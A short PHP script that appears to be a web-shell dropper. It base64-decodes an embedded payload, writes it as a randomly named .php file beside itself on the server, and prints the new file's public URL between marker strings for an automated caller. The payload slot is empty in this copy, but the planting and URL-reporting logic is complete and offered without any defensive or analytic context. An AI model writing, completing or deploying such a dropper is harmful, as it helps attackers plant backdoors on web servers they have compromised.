<?php

$payload_file = "";

srand(time());

function GetPayload($payload)
{
    $current_payload = base64_decode($payload);

    return $current_payload;
}

function WritePayload($path, $payload)
{
    if (!file_exists($path))
    {
        if (file_put_contents($path, GetPayload($payload)) != FALSE)
        {
            return TRUE;
        }
    }

    return FALSE;
}

$payload_name = substr(md5(time()), 0, 6) . ".php";

$local_payload_path = dirname(__FILE__) . "/" . $payload_name;
$remote_payload_path = "http://" . @$_SERVER['HTTP_HOST'] . (dirname(@$_SERVER['REQUEST_URI']) == "/" ? "" : dirname(@$_SERVER['REQUEST_URI'])) . "/" . $payload_name;

WritePayload($local_payload_path, $payload_file);

echo "URL#" . $remote_payload_path . "#ENDURL" . PHP_EOL;

exit();
